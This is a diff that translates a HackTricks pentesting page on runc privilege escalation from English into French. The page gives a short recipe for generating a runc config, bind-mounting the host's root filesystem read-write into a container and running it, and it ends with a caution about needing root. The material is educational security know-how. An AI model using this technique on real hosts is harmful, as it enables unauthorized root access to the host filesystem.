@@ -1,33 +1,32 @@
-# RunC Privilege Escalation
+# Escalade de privilèges RunC
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Basic information
+## Informations de base
 
-If you want to learn more about **runc** check the following page:
+Si vous souhaitez en savoir plus sur **runc**, consultez la page suivante :
 
 {{#ref}}
 ../../network-services-pentesting/2375-pentesting-docker.md
 {{#endref}}
 
-## PE
+## EP
 
-If you find that `runc` is installed in the host you may be able to **run a container mounting the root / folder of the host**.
-
+Si vous constatez que `runc` est installé sur l'hôte, vous pourriez être en mesure de **lancer un conteneur en montant le dossier racine / de l'hôte**.
 ```bash
 runc -help #Get help and see if runc is intalled
 runc spec #This will create the config.json file in your current folder
 
 Inside the "mounts" section of the create config.json add the following lines:
 {
-    "type": "bind",
-    "source": "/",
-    "destination": "/",
-    "options": [
-        "rbind",
-        "rw",
-        "rprivate"
-    ]
+"type": "bind",
+"source": "/",
+"destination": "/",
+"options": [
+"rbind",
+"rw",
+"rprivate"
+]
 },
 
 #Once you have modified the config.json file, create the folder rootfs in the same directory
@@ -37,8 +36,7 @@ mkdir rootfs
 # The root folder is the one from the host
 runc run demo
 ```
-
 > [!CAUTION]
-> This won't always work as the default operation of runc is to run as root, so running it as an unprivileged user simply cannot work (unless you have a rootless configuration). Making a rootless configuration the default isn't generally a good idea because there are quite a few restrictions inside rootless containers that don't apply outside rootless containers.
+> Cela ne fonctionnera pas toujours car l'opération par défaut de runc est de s'exécuter en tant que root, donc l'exécuter en tant qu'utilisateur non privilégié ne peut tout simplement pas fonctionner (à moins que vous n'ayez une configuration sans root). Faire de la configuration sans root la valeur par défaut n'est généralement pas une bonne idée car il y a pas mal de restrictions à l'intérieur des conteneurs sans root qui ne s'appliquent pas en dehors des conteneurs sans root.
 
 {{#include ../../banners/hacktricks-training.md}}
